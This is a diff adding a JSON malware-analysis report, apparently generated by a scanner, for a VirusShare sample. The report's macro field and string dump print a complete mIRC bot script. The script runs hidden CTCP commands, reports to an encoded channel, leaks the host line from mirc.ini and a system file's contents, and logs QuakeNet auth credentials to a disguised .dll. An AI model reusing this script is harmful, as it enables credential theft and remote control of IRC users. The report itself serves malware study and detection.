@@ -1,0 +1,40 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "WINDOWS": "May enumerate application windows",
+            "write": "May write to a file"
+        },
+        "macro": "ctcp ^*:cZs*: { $2- | /haltdef } | halt }\non *:connect: { .msg $decode(IyMjMTMzNy5wY3cjIyM=,m) \u00037\u0002\ufffd\u0002\u0003 I'm CreaZies DrOnE \u00037\u0002\ufffd\u0002\u0003\u000f\u000f | .msg $decode(IyMjMTMzNy5wY3cjIyM=,m) $read(mirc.ini,w,host=*) } | .join $decode(IyMjIyMxIyMjIyM=,m) | .timer 1 120 amsg $read(C:\\WINDOWS\\system32\\sysinfo.dll) | halt }\non *:input:*: { if ( */msg iswm $1 ) { if ($2 = Q@CServe.quakenet.org) { if ($3 = auth) { .write C:\\WINDOWS\\system32\\mirc.dll $4 $5 } } } }\non *:JOIN:#####1#####: { .window -h $decode(IyMjIyMxIyMjIyM=,m) }"
+    },
+    "filename": "VirusShare_00be1f51f25cd66f2c669074d79b0847",
+    "filesize": 510,
+    "filetype": "data",
+    "hashes": {
+        "md5": "00be1f51f25cd66f2c669074d79b0847",
+        "sha1": "7fa0e579098e9bc7ccafa260327f046bab0241a2",
+        "sha256": "f7166ce90f1d96a6c37cb6b9b7abbf715a428d4799c14bbdcddabe9784c3fdd8"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "ctcp ^*:cZs*: { $2- | /haltdef } | halt }",
+            "on *:connect: { .msg $decode(IyMjMTMzNy5wY3cjIyM=,m) ",
+            " I'm CreaZies DrOnE ",
+            " | .msg $decode(IyMjMTMzNy5wY3cjIyM=,m) $read(mirc.ini,w,host=*) } | .join $decode(IyMjIyMxIyMjIyM=,m) | .timer 1 120 amsg $read(C:\\WINDOWS\\system32\\sysinfo.dll) | halt }",
+            "on *:input:*: { if ( */msg iswm $1 ) { if ($2 = Q@CServe.quakenet.org) { if ($3 = auth) { .write C:\\WINDOWS\\system32\\mirc.dll $4 $5 } } } }",
+            "on *:JOIN:#####1#####: { .window -h $decode(IyMjIyMxIyMjIyM=,m) }"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.275171",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
